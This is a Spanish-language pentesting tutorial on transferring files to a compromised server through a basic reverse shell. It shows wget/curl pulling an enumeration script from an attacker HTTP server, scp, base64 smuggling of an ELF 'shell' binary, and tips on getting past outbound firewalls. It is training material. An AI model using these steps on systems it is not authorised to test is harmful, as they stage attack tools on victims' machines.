# Transferencia de archivos

Durante una prueba de penetración es frecuente necesitar transferir scripts, exploits o datos entre nuestro host atacante y el servidor comprometido. Si contamos con un shell ‘normal’ (reverse shell sin funcionalidades avanzadas), aquí tienes métodos prácticos y fiables.

---

## Resumen rápido (destacados)

* **HTTP simple (python -m http.server)** + `wget`/`curl` es la forma más rápida cuando el host puede acceder a nuestra máquina.
* **scp (Secure Copy)** funciona si tenemos credenciales SSH o una clave válida.
* **base64** es la solución cuando no hay conectividad directa; codificamos en local, pegamos el texto y decodificamos en remoto.
* **Verificación**: usar `file` y `md5sum` para comprobar integridad tras la transferencia.
* Siempre comprobar permisos y limpiar (borrar servidores temporales / archivos) tras la operación.

---

## 1) Servidor HTTP en máquina atacante + wget/curl en remoto

En la máquina atacante, situarnos en el directorio que contiene el fichero y lanzar un servidor HTTP (puerto 8000):

```bash
cd /tmp
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

En el host remoto (si tiene `wget`):

```bash
wget http://10.10.14.1:8000/linenum.sh
# Saving to: 'linenum.sh'
```

Si no tiene `wget`, usar `curl`:

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

---

## 2) SCP (Secure Copy) — requiere credenciales SSH

Desde la máquina atacante, subir un archivo al remoto:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
# user@remotehost's password: *********
```

---

## 3) Base64 — útil cuando no es posible abrir puertos o iniciar un servidor

Codificar localmente (sin saltos de línea):

```bash
base64 shell -w 0
# salida: f0VMRgIBAQ... (cadena larga)
```

Pegar la cadena en el host remoto y decodificar:

```bash
echo f0VMRgIBAQ... | base64 -d > shell
```

---

## 4) Validación de la transferencia

Comprobar el tipo de archivo en remoto:

```bash
file shell
# shell: ELF 64-bit LSB executable, x86-64, ...
```

Comprobar hash MD5 en ambas máquinas para garantizar integridad:

```bash
# En la máquina atacante
md5sum shell
# 321de1d7e7c3735838890a72c9ae7d1d  shell

# En el host remoto
md5sum shell
# 321de1d7e7c3735838890a72c9ae7d1d  shell
```

---

## Consejos operativos

* Si ejecutas `python3 -m http.server`, recuerda cerrar el servidor y borrar los ficheros temporales cuando termines.
* Ajusta permisos (por ejemplo `chmod +x shell`) si vas a ejecutar binarios.
* Evita transferir ficheros a rutas críticas; usar `/tmp` o `/var/tmp` cuando sea apropiado.
* Si el host tiene restricciones salientes (firewall), prueba usar puertos comunes (80/443) o transferencia por canales ya existentes (web shells, SFTP sobre SSH si está disponible).

---

## Recursos y lecturas adicionales

* Módulo «Transferencias de archivos» (curso / repositorio interno)

---

*Fin del documento.*
